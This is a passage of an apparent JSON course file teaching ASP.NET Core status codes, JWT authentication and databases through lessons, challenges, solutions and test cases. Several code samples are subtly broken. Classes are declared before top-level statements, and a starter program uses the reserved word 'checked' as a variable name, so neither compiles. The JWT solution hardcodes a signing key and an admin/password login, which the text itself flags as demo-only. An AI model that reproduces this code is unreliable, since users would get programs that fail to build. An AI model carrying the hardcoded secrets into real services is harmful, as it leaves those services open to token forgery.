              "code": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass User\n{\n    public int Id { get; set; }\n    public string? Name { get; set; }\n    public string? Email { get; set; }\n    public int Age { get; set; }\n}\n\nvar users = new List<User>\n{\n    new User { Id = 1, Name = \"Alice\", Email = \"alice@example.com\", Age = 30 }\n};\n\nint nextId = 2;\n\n// 200 OK - Standard success\napp.MapGet(\"/api/users\", () => \n{\n    return Results.Ok(users);  // Explicit 200\n    // OR just: return users;  // Implicit 200\n});\n\n// 200 OK or 404 Not Found\napp.MapGet(\"/api/users/{id}\", (int id) =>\n{\n    var user = users.FirstOrDefault(u => u.Id == id);\n    return user is not null \n        ? Results.Ok(user)        // 200 with data\n        : Results.NotFound();     // 404\n});\n\n// 201 Created - New resource\napp.MapPost(\"/api/users\", (User user) =>\n{\n    // Validation\n    if (string.IsNullOrEmpty(user.Name))\n        return Results.BadRequest(\"Name is required!\");  // 400\n    \n    if (user.Age < 0 || user.Age > 120)\n        return Results.BadRequest(\"Invalid age!\");  // 400\n    \n    user.Id = nextId++;\n    users.Add(user);\n    \n    // 201 with location header and created object\n    return Results.Created($\"/api/users/{user.Id}\", user);\n});\n\n// 200 OK or 404 Not Found\napp.MapPut(\"/api/users/{id}\", (int id, User updatedUser) =>\n{\n    var user = users.FirstOrDefault(u => u.Id == id);\n    if (user is null) return Results.NotFound();  // 404\n    \n    // Validation\n    if (updatedUser.Age < 0)\n        return Results.BadRequest(\"Age cannot be negative!\");  // 400\n    \n    user.Name = updatedUser.Name;\n    user.Email = updatedUser.Email;\n    user.Age = updatedUser.Age;\n    \n    return Results.Ok(user);  // 200 with updated data\n});\n\n// 204 No Content or 404 Not Found\napp.MapDelete(\"/api/users/{id}\", (int id) =>\n{\n    var user = users.FirstOrDefault(u => u.Id == id);\n    if (user is null) return Results.NotFound();  // 404\n    \n    users.Remove(user);\n    return Results.NoContent();  // 204 - success, no data\n});\n\n// Custom status code\napp.MapGet(\"/api/admin\", () =>\n{\n    return Results.StatusCode(403);  // 403 Forbidden\n});\n\napp.Run();",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`TypedResults.Ok(value)`**: Returns 200 OK with strongly-typed data. Preferred over Results.Ok() for compile-time safety and auto OpenAPI docs!\n\n**`TypedResults.Created(uri, value)`**: Returns 201 Created. First param is URL of new resource. Used for POST. Tells client where to find the new item!\n\n**`TypedResults.BadRequest(message)`**: Returns 400 Bad Request. Use when client sends invalid data. Include helpful error message!\n\n**`TypedResults.NotFound()`**: Returns 404 Not Found. Resource doesn't exist. Don't return null - use proper 404!\n\n**`TypedResults.NoContent()`**: Returns 204 No Content. Success but no data to return. Common for DELETE operations.\n\n**`Results<T1, T2, T3> return type`**: Declare possible return types! Example: 'Results<Ok<User>, BadRequest<string>, NotFound>' tells OpenAPI all possible responses.\n\n**`TypedResults.Problem()`**: Returns RFC 7807 Problem Details (.NET 9 enhanced!). Standard format for API errors with title, status, detail fields."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues!\n\n**Returning 200 for errors**: Don't return 200 OK for validation failures! Use 400 BadRequest. Status codes communicate meaning to clients!\n\n**Empty BadRequest messages**: 'Results.BadRequest()' with no message is unhelpful! Always include: 'Results.BadRequest(\"Name is required!\")'. Help clients fix issues!\n\n**Using 200 instead of 201 for POST**: Created resources should return 201 Created, not 200 OK! Use 'TypedResults.Created(uri, value)' for proper semantics.\n\n**Returning null instead of 404**: 'return null' gives 204 No Content, not 404! Use 'TypedResults.NotFound()' for missing resources.\n\n**Inconsistent error formats**: Use Problem Details (TypedResults.Problem()) for consistent error responses that follow RFC 7807 standard."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a Product API with proper status codes and validation!\n\n1. Create 'Product' class (Id, Name, Price, Stock)\n\n2. Create endpoints with PROPER status codes:\n\n   GET /api/products -> 200 OK with all products\n   \n   GET /api/products/{id} -> 200 OK if found, 404 if not\n   \n   POST /api/products -> Validate:\n     - Name required (400 if missing)\n     - Price must be > 0 (400 if not)\n     - Stock must be >= 0 (400 if negative)\n     - If valid: 201 Created with location\n   \n   PUT /api/products/{id} -> Validate same as POST:\n     - 404 if product not found\n     - 400 if validation fails\n     - 200 OK with updated product if success\n   \n   DELETE /api/products/{id} -> 404 if not found, 204 if deleted\n\n3. Return helpful error messages for 400 responses!",
              "starterCode": "using Microsoft.AspNetCore.Builder;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n    public int Stock { get; set; }\n}\n\nvar products = new List<Product>\n{\n    new Product { Id = 1, Name = \"Laptop\", Price = 999.99m, Stock = 10 }\n};\nint nextId = 2;\n\napp.MapGet(\"/api/products\", () => Results.Ok(products));\n\napp.MapGet(\"/api/products/{id}\", (int id) =>\n{\n    // Find and return 200 or 404\n});\n\napp.MapPost(\"/api/products\", (Product product) =>\n{\n    // Validate Name\n    // Validate Price\n    // Validate Stock\n    // If valid, add and return 201\n});\n\napp.MapPut(\"/api/products/{id}\", (int id, Product updated) =>\n{\n    // Find product (404 if not found)\n    // Validate input (400 if invalid)\n    // Update and return 200\n});\n\napp.MapDelete(\"/api/products/{id}\", (int id) =>\n{\n    // Find and delete, return 204 or 404\n});\n\nConsole.WriteLine(\"Product API with proper status codes!\");",
              "solution": "using Microsoft.AspNetCore.Builder;\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar app = builder.Build();\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n    public int Stock { get; set; }\n}\n\nvar products = new List<Product>\n{\n    new Product { Id = 1, Name = \"Laptop\", Price = 999.99m, Stock = 10 }\n};\nint nextId = 2;\n\napp.MapGet(\"/api/products\", () => Results.Ok(products));\n\napp.MapGet(\"/api/products/{id}\", (int id) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    return product is not null ? Results.Ok(product) : Results.NotFound();\n});\n\napp.MapPost(\"/api/products\", (Product product) =>\n{\n    if (string.IsNullOrEmpty(product.Name))\n        return Results.BadRequest(\"Product name is required!\");\n    \n    if (product.Price <= 0)\n        return Results.BadRequest(\"Price must be greater than 0!\");\n    \n    if (product.Stock < 0)\n        return Results.BadRequest(\"Stock cannot be negative!\");\n    \n    product.Id = nextId++;\n    products.Add(product);\n    return Results.Created($\"/api/products/{product.Id}\", product);\n});\n\napp.MapPut(\"/api/products/{id}\", (int id, Product updated) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    if (product is null) return Results.NotFound();\n    \n    if (string.IsNullOrEmpty(updated.Name))\n        return Results.BadRequest(\"Product name is required!\");\n    \n    if (updated.Price <= 0)\n        return Results.BadRequest(\"Price must be greater than 0!\");\n    \n    if (updated.Stock < 0)\n        return Results.BadRequest(\"Stock cannot be negative!\");\n    \n    product.Name = updated.Name;\n    product.Price = updated.Price;\n    product.Stock = updated.Stock;\n    \n    return Results.Ok(product);\n});\n\napp.MapDelete(\"/api/products/{id}\", (int id) =>\n{\n    var product = products.FirstOrDefault(p => p.Id == id);\n    if (product is null) return Results.NotFound();\n    \n    products.Remove(product);\n    return Results.NoContent();\n});\n\nConsole.WriteLine(\"Product API with proper status codes!\");\nConsole.WriteLine(\"Returns: 200 OK, 201 Created, 204 No Content, 400 Bad Request, 404 Not Found\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"Product API\"",
                  "expectedOutput": "Product API",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"status codes\"",
                  "expectedOutput": "status codes",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"200\"",
                  "expectedOutput": "200",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"201\"",
                  "expectedOutput": "201",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"400\"",
                  "expectedOutput": "400",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"404\"",
                  "expectedOutput": "404",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Validation: check conditions, return Results.BadRequest(\"message\") if invalid. Not found: Results.NotFound(). Success: Results.Ok(data) or Results.Created(uri, data) or Results.NoContent()."
                },
                {
                  "level": 2,
                  "text": "Returning wrong status for errors: Don't return 200 OK for errors! Validation failure = 400 Bad Request. Resource not found = 404. Use correct codes!"
                },
                {
                  "level": 3,
                  "text": "Not including error messages: Results.BadRequest() with no message is unhelpful! Always include message: Results.BadRequest(\\\"Name is required!\\\"). Help the client fix the issue!"
                },
                {
                  "level": 4,
                  "text": "Using 200 for POST: POST should return 201 Created, not 200! Use Results.Created() with location URI. It's the HTTP standard for resource creation."
                },
                {
                  "level": 5,
                  "text": "Returning null instead of 404: Don't 'return null' - it gives 204 No Content! Use 'Results.NotFound()' for proper 404 status. Status codes communicate meaning!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Returning wrong status for errors",
                  "consequence": "Don't return 200 OK for errors! Validation failure = 400 Bad Request. Resource not found = 404. Use correct codes!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Not including error messages",
                  "consequence": "Results.BadRequest() with no message is unhelpful! Always include message: Results.BadRequest(\\\"Name is required!\\\"). Help the client fix the issue!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Using 200 for POST",
                  "consequence": "POST should return 201 Created, not 200! Use Results.Created() with location URI. It's the HTTP standard for resource creation.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Returning null instead of 404",
                  "consequence": "Don't 'return null' - it gives 204 No Content! Use 'Results.NotFound()' for proper 404 status. Status codes communicate meaning!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-11-06",
          "title": "Authentication & Authorization (The Security Guard)",
          "moduleId": "module-11",
          "order": 6,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine a concert venue:\n\nAUTHENTICATION = 'Who are you?'\n• Checking your ID at the entrance\n• Proving your identity (username + password, or ticket)\n• Result: You ARE who you claim to be\n\nAUTHORIZATION = 'What can you do?'\n• VIP pass gets backstage access\n• General admission stays in crowd\n• Result: You have PERMISSION for specific areas\n\nASP.NET Core 9 offers:\n1. MapIdentityApi<TUser>() - NEW! Built-in Identity endpoints (/register, /login, /logout)\n2. JWT Bearer Tokens - Stateless API authentication\n3. Cookie Authentication - Session-based for web apps\n4. External Providers - Google, Microsoft, GitHub login (OAuth/OpenID Connect)\n\nMODERN APPROACH (.NET 8/9):\n• MapIdentityApi for quick setup (handles registration, login, 2FA!)\n• Bearer tokens for API clients\n• Cookies for browser-based apps\n• .RequireAuthorization() for endpoint protection\n\nThink: 'Authentication = Login check, Authorization = Permission check!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== OPTION 1: MapIdentityApi (.NET 8/9 - EASIEST!) =====\n// Built-in endpoints for /register, /login, /refresh, /confirmEmail, etc.\n\nusing Microsoft.AspNetCore.Identity;\nusing Microsoft.AspNetCore.Identity.EntityFrameworkCore;\nusing Microsoft.EntityFrameworkCore;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add Identity with Entity Framework\nbuilder.Services.AddDbContext<AppDbContext>(options =>\n    options.UseInMemoryDatabase(\"AuthDb\"));\n\nbuilder.Services.AddIdentityApiEndpoints<IdentityUser>()\n    .AddEntityFrameworkStores<AppDbContext>();\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\n// Map ALL Identity endpoints automatically!\napp.MapIdentityApi<IdentityUser>();  // Creates /register, /login, /refresh, etc.!\n\napp.UseAuthorization();\n\n// Protected endpoint\napp.MapGet(\"/api/profile\", (ClaimsPrincipal user) =>\n{\n    return TypedResults.Ok(new { user.Identity?.Name });\n}).RequireAuthorization();\n\n// Public endpoint\napp.MapGet(\"/api/public\", () => \"Anyone can access!\");\n\napp.Run();\n\nclass AppDbContext : IdentityDbContext<IdentityUser>\n{\n    public AppDbContext(DbContextOptions<AppDbContext> options) : base(options) { }\n}\n\n// ===== OPTION 2: Custom JWT (More Control) =====\n/*\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\nusing System.Security.Claims;\nusing System.IdentityModel.Tokens.Jwt;\n\nvar builder = WebApplication.CreateBuilder(args);\nvar jwtKey = \"YourSuperSecretKey32CharactersMin!\";\n\nbuilder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer(options => {\n        options.TokenValidationParameters = new TokenValidationParameters\n        {\n            ValidateIssuer = true,\n            ValidateAudience = true,\n            ValidateLifetime = true,\n            ValidateIssuerSigningKey = true,\n            ValidIssuer = \"MyApp\",\n            ValidAudience = \"MyAppUsers\",\n            IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey))\n        };\n    });\n\nbuilder.Services.AddAuthorization();\nvar app = builder.Build();\n\napp.UseAuthentication();  // MUST come BEFORE UseAuthorization!\napp.UseAuthorization();\n\napp.MapPost(\"/login\", (LoginRequest req) => {\n    if (req.Email == \"admin@test.com\" && req.Password == \"password\") {\n        var token = new JwtSecurityToken(\n            issuer: \"MyApp\", audience: \"MyAppUsers\",\n            claims: new[] { new Claim(ClaimTypes.Name, req.Email) },\n            expires: DateTime.Now.AddHours(1),\n            signingCredentials: new SigningCredentials(\n                new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey)),\n                SecurityAlgorithms.HmacSha256));\n        return TypedResults.Ok(new { token = new JwtSecurityTokenHandler().WriteToken(token) });\n    }\n    return TypedResults.Unauthorized();\n});\n\napp.MapGet(\"/protected\", () => \"Secret!\").RequireAuthorization();\nrecord LoginRequest(string Email, string Password);\n*/\n\n// MapIdentityApi endpoints created:\n// POST /register - Create new user\n// POST /login - Get access token (use ?useCookies=false for bearer tokens)\n// POST /refresh - Refresh access token\n// GET /confirmEmail - Confirm email address\n// POST /forgotPassword - Initiate password reset\n// POST /manage/2fa - Setup two-factor auth",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`MapIdentityApi<TUser>()`**: .NET 8/9 feature! Automatically creates /register, /login, /refresh, /confirmEmail endpoints. Uses bearer tokens by default (add ?useCookies=true for cookies).\n\n**`AddIdentityApiEndpoints<TUser>()`**: Registers Identity services with token support. Includes password hashing, email confirmation, 2FA. Pair with .AddEntityFrameworkStores<TContext>().\n\n**`UseAuthentication() + UseAuthorization()`**: Middleware order matters! Authentication MUST come before Authorization. Wrong order = authorization always fails!\n\n**`.RequireAuthorization()`**: Protects endpoints. No parameters = any authenticated user. With policy: `RequireAuthorization(policy => policy.RequireRole(\"Admin\"))`.\n\n**`ClaimsPrincipal user`**: Injected parameter containing user info from token. Access claims: `user.FindFirst(\"ClaimType\")?.Value`. Get name: `user.Identity?.Name`.\n\n**`Bearer tokens vs Cookies`**: MapIdentityApi supports both! Use ?useCookies=false in /login for bearer tokens (APIs). Cookies for browser apps. Bearer tokens are stateless and scalable."
            },
            {
              "type": "WARNING",
              "title": "Security Pitfalls",
              "content": "## Critical Security Issues to Avoid!\n\n**Wrong middleware order**: UseAuthorization() before UseAuthentication() = EVERY request fails authorization! Remember: 'Who are you?' BEFORE 'What can you do?'\n\n**JWT key too short**: Keys under 32 characters throw 'IDX10653: The encryption key is too small'. HmacSha256 requires 256 bits minimum!\n\n**Storing JWT in localStorage**: JavaScript can read localStorage! XSS attack = stolen tokens. Use httpOnly cookies or short-lived tokens with refresh tokens.\n\n**Hardcoding secrets**: NEVER put JWT keys in source code! Use Configuration, Environment Variables, or Azure Key Vault/AWS Secrets Manager.\n\n**Not validating token claims**: Always set ValidateIssuer, ValidateAudience, ValidateIssuerSigningKey to TRUE. Attackers can modify tokens if signature isn't verified!\n\n**MapIdentityApi exposes all endpoints**: Consider using 'app.MapGroup(\"/auth\").MapIdentityApi<User>()' to prefix routes and add rate limiting."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-11-06-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a protected API with JWT authentication!\n\n1. Set up JWT authentication in Program.cs:\n   - Add authentication services\n   - Configure token validation parameters\n   - Add authorization services\n\n2. Create endpoints:\n   - POST /login - Issues JWT token for valid credentials\n   - GET /api/public - Accessible to everyone\n   - GET /api/protected - Requires authentication\n   - GET /api/admin - Requires 'Admin' role\n\n3. In the login endpoint:\n   - Validate credentials (use hardcoded for demo)\n   - Create claims (Name, Role, custom claims)\n   - Generate and return JWT token\n\n4. Access user info in protected endpoints:\n   - Read claims from ClaimsPrincipal\n   - Return personalized response\n\nRemember: UseAuthentication() BEFORE UseAuthorization()!",
              "starterCode": "using Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\nusing System.Security.Claims;\nusing System.IdentityModel.Tokens.Jwt;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Add JWT authentication\n// builder.Services.AddAuthentication(...)\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\n// TODO: Add middleware (correct order!)\n// app.UseAuthentication();\n// app.UseAuthorization();\n\n// Login endpoint\napp.MapPost(\"/login\", (LoginRequest request) =>\n{\n    // TODO: Validate and issue token\n    return Results.Unauthorized();\n});\n\nrecord LoginRequest(string Username, string Password);\n\n// Public endpoint\napp.MapGet(\"/api/public\", () => \"Public data\");\n\n// Protected endpoint\napp.MapGet(\"/api/protected\", (ClaimsPrincipal user) =>\n{\n    // TODO: Return user info\n    return Results.Ok();\n}); // TODO: .RequireAuthorization()\n\n// Admin endpoint\napp.MapGet(\"/api/admin\", () => \"Admin only!\");\n// TODO: .RequireAuthorization(policy => policy.RequireRole(\"Admin\"))\n\nConsole.WriteLine(\"Auth endpoints defined!\");",
              "solution": "using Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\nusing System.Security.Claims;\nusing System.IdentityModel.Tokens.Jwt;\n\nvar builder = WebApplication.CreateBuilder(args);\n\nvar jwtKey = \"SuperSecretKey12345678901234567890\"; // 32+ chars for HS256\nvar jwtIssuer = \"MyApp\";\nvar jwtAudience = \"MyAppUsers\";\n\nbuilder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer(options =>\n    {\n        options.TokenValidationParameters = new TokenValidationParameters\n        {\n            ValidateIssuer = true,\n            ValidateAudience = true,\n            ValidateLifetime = true,\n            ValidateIssuerSigningKey = true,\n            ValidIssuer = jwtIssuer,\n            ValidAudience = jwtAudience,\n            IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey))\n        };\n    });\n\nbuilder.Services.AddAuthorization();\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapPost(\"/login\", (LoginRequest request) =>\n{\n    if (request.Username == \"admin\" && request.Password == \"password\")\n    {\n        var claims = new[]\n        {\n            new Claim(ClaimTypes.Name, request.Username),\n            new Claim(ClaimTypes.Role, \"Admin\"),\n            new Claim(\"UserId\", \"1\")\n        };\n        \n        var key = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey));\n        var creds = new SigningCredentials(key, SecurityAlgorithms.HmacSha256);\n        \n        var token = new JwtSecurityToken(\n            issuer: jwtIssuer,\n            audience: jwtAudience,\n            claims: claims,\n            expires: DateTime.Now.AddHours(1),\n            signingCredentials: creds\n        );\n        \n        return Results.Ok(new { token = new JwtSecurityTokenHandler().WriteToken(token) });\n    }\n    return Results.Unauthorized();\n});\n\nrecord LoginRequest(string Username, string Password);\n\napp.MapGet(\"/api/public\", () => \"Public data - anyone can see!\");\n\napp.MapGet(\"/api/protected\", (ClaimsPrincipal user) =>\n{\n    var name = user.Identity?.Name;\n    var userId = user.FindFirst(\"UserId\")?.Value;\n    return Results.Ok(new { message = $\"Hello {name}!\", userId });\n}).RequireAuthorization();\n\napp.MapGet(\"/api/admin\", () => \"Admin dashboard data!\")\n    .RequireAuthorization(policy => policy.RequireRole(\"Admin\"));\n\nConsole.WriteLine(\"JWT Auth API configured!\");\nConsole.WriteLine(\"POST /login → Get token\");\nConsole.WriteLine(\"GET /api/public → No auth needed\");\nConsole.WriteLine(\"GET /api/protected → Auth required\");\nConsole.WriteLine(\"GET /api/admin → Admin role required\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should show auth configuration",
                  "expectedOutput": "Auth",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention endpoints",
                  "expectedOutput": "/login",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Authentication setup: 'builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme).AddJwtBearer(options => { ... });'"
                },
                {
                  "level": 2,
                  "text": "Middleware order is CRITICAL: UseAuthentication() MUST come BEFORE UseAuthorization(). Wrong order = authorization always fails!"
                },
                {
                  "level": 3,
                  "text": "JWT key must be 32+ characters for HmacSha256! Shorter keys cause 'key too small' error."
                },
                {
                  "level": 4,
                  "text": "Add claims to token: 'new Claim(ClaimTypes.Role, \"Admin\")'. Access in endpoints: 'user.FindFirst(ClaimTypes.Role)?.Value'."
                },
                {
                  "level": 5,
                  "text": "Protect endpoints: '.RequireAuthorization()' for any auth user, '.RequireAuthorization(p => p.RequireRole(\"Admin\"))' for specific role."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Wrong middleware order",
                  "consequence": "UseAuthorization() before UseAuthentication() = every request unauthorized! Authentication populates User, Authorization checks it.",
                  "correction": "Always: UseAuthentication() THEN UseAuthorization(). Think: 'Who are you?' BEFORE 'What can you do?'"
                },
                {
                  "mistake": "JWT key too short",
                  "consequence": "Key under 32 characters throws 'IDX10653: The encryption key is too small'. HmacSha256 requires 256 bits = 32 bytes minimum.",
                  "correction": "Use 32+ character key: 'SuperSecretKey12345678901234567890'. In production, use configuration or secrets manager!"
                },
                {
                  "mistake": "Storing JWT in localStorage (XSS vulnerability!)",
                  "consequence": "JavaScript can read localStorage! XSS attack = stolen tokens. Attacker impersonates users.",
                  "correction": "Store tokens in httpOnly cookies (server sets, JS can't read). Or use short-lived tokens with refresh tokens."
                },
                {
                  "mistake": "Not validating token claims properly",
                  "consequence": "Trusting all claims without verification! Attacker modifies token claims (if not validating signature properly).",
                  "correction": "Always set ValidateIssuer, ValidateAudience, ValidateIssuerSigningKey to true. Never skip signature validation!"
                },
                {
                  "mistake": "Hardcoding credentials and secrets",
                  "consequence": "Secrets in source code = compromised when code is shared. Anyone with repo access has your keys!",
                  "correction": "Use Configuration (appsettings.json), Environment Variables, or Azure Key Vault / AWS Secrets Manager for production secrets."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-12",
      "title": "File I/O, Databases & Caching",
      "description": "Work with databases using Entity Framework Core, learn ORM patterns, compiled models for performance, and modern caching with HybridCache.",
      "difficulty": "beginner",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-12-01",
          "title": "Why Databases? (Beyond Text Files)",
          "moduleId": "module-12",
          "order": 1,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine storing customer data in text files:\n\nfile1.txt: 'John, john@email.com, 25'\nfile2.txt: 'Jane, jane@email.com, 30'\n\nPROBLEMS:\n• Want to find all customers over 25? Read EVERY file!\n• Want to update Jane's email? Find the right file, rewrite it!\n• Two programs edit the same file? DATA CORRUPTION!\n• App crashes while writing? FILE CORRUPTED!\n• Store 1 million customers? 1 MILLION FILES!\n\nDATABASES solve this:\n\n✅ FAST SEARCHING - Find data in milliseconds (indexes!)\n✅ TRANSACTIONS - All-or-nothing updates (no corruption!)\n✅ CONCURRENT ACCESS - Multiple users safely\n✅ RELATIONSHIPS - Connect related data (customers → orders)\n✅ DATA INTEGRITY - Enforce rules (email must be unique)\n✅ SCALABILITY - Handle millions of records\n\nCommon databases:\n• SQL Server (Microsoft)\n• PostgreSQL (open source)\n• MySQL (open source)\n• SQLite (embedded, file-based)\n\nThink: Database = 'Professional, high-performance data storage with superpowers!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// WITHOUT DATABASE - text file storage (bad!)\nusing System.IO;\nusing System.Collections.Generic;\n\nclass Customer\n{\n    public string Name;\n    public string Email;\n}\n\n// Writing to text file\nvoid SaveCustomer(Customer customer)\n{\n    File.AppendAllText(\"customers.txt\", \n        $\"{customer.Name},{customer.Email}\\n\");\n}\n\n// Reading from text file (slow!)\nList<Customer> LoadCustomers()\n{\n    var customers = new List<Customer>();\n    var lines = File.ReadAllLines(\"customers.txt\");\n    \n    foreach (var line in lines)\n    {\n        var parts = line.Split(',');\n        customers.Add(new Customer \n        { \n            Name = parts[0], \n            Email = parts[1] \n        });\n    }\n    return customers;\n}\n\n// Finding customer (read ENTIRE file!)\nCustomer? FindByEmail(string email)\n{\n    var customers = LoadCustomers();  // Read ALL data!\n    return customers.FirstOrDefault(c => c.Email == email);\n}\n\n// WITH DATABASE (next lessons!) - pseudocode\n/*\nvar customer = dbContext.Customers\n    .Where(c => c.Email == \"john@email.com\")\n    .FirstOrDefault();  // Database finds it instantly!\n\n// Update\ncustomer.Email = \"newemail@example.com\";\ndbContext.SaveChanges();  // Transaction ensures safety!\n*/\n\n// Database features you get:\n// - Indexes for fast searching\n// - Transactions (all-or-nothing)\n// - Constraints (email MUST be unique)\n// - Relationships (Customer has many Orders)\n// - Concurrent access (multiple users safely)\n// - Query optimization (database is smart!)",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`Text file problems`**: Text files: slow search (read everything), no transactions (corruption risk), no relationships, no concurrency. Fine for config, terrible for data!\n\n**`Database advantages`**: Databases: indexed (fast!), transactional (safe!), relational (connected data!), concurrent (multi-user!), scalable (millions of rows!).\n\n**`SQL vs NoSQL`**: SQL (relational): tables, rows, columns, relationships. NoSQL (document/key-value): flexible schema. We'll learn SQL (most common for business apps).\n\n**`Database types`**: SQL Server (enterprise), PostgreSQL (open-source powerhouse), MySQL (popular web), SQLite (embedded, no server). Each has strengths!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-12-01-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Understand the limitations of file-based storage!\n\n1. Create a 'Product' class (Id, Name, Price)\n\n2. Create a list of 5 products\n\n3. Simulate file storage:\n   - 'Save' products by printing each as CSV line\n   - Print: \\\"Saving to file: [Id],[Name],[Price]\\\"\n\n4. Simulate file search:\n   - To find product by ID, print \\\"Reading entire file...\\\"\n   - Loop through ALL products to find match\n   - Print how many products were checked\n\n5. Explain the problems:\n   - Print why this is slow for 1 million products\n   - Print why concurrent writes are dangerous\n   - Print what databases solve\n\nThis demonstrates WHY we need databases!",
              "starterCode": "using System;\nusing System.Collections.Generic;\nusing System.Linq;\n\nclass Product\n{\n    public int Id { get; set; }\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n}\n\n// Create sample data\nvar products = new List<Product>\n{\n    new Product { Id = 1, Name = \"Laptop\", Price = 999.99m },\n    // Add 4 more\n};\n\n// Simulate saving to file\nConsole.WriteLine(\"=== SIMULATING FILE STORAGE ===\");\nforeach (var p in products)\n{\n    Console.WriteLine($\"Saving to file: {p.Id},{p.Name},{p.Price}\");\n}\n\n// Simulate searching (inefficient!)\nConsole.WriteLine(\"\\n=== SEARCHING FOR PRODUCT ID 3 ===\");\nConsole.WriteLine(\"Reading entire file...\");\n\nint searchId = 3;\nint checked = 0;\nProduct? found = null;\n\nforeach (var p in products)\n{\n    checked++;\n    if (p.Id == searchId)\n    {\n        found = p;\n        break;\n    }\n}\n\nConsole.WriteLine($\"Checked {checked} products\");\nif (found != null)\n    Console.WriteLine($\"Found: {found.Name}\");\n\n// Explain problems\nConsole.WriteLine(\"\\n=== WHY THIS IS BAD ===\");\nConsole.WriteLine(\"Problem 1: With 1 million products, searching reads ALL 1 million!\");\nConsole.WriteLine(\"Problem 2: Two users writing at once = file corruption!\");\nConsole.WriteLine(\"Problem 3: No relationships (can't link products to orders easily)\");\nConsole.WriteLine(\"\\nSOLUTION: Use a DATABASE!\");",
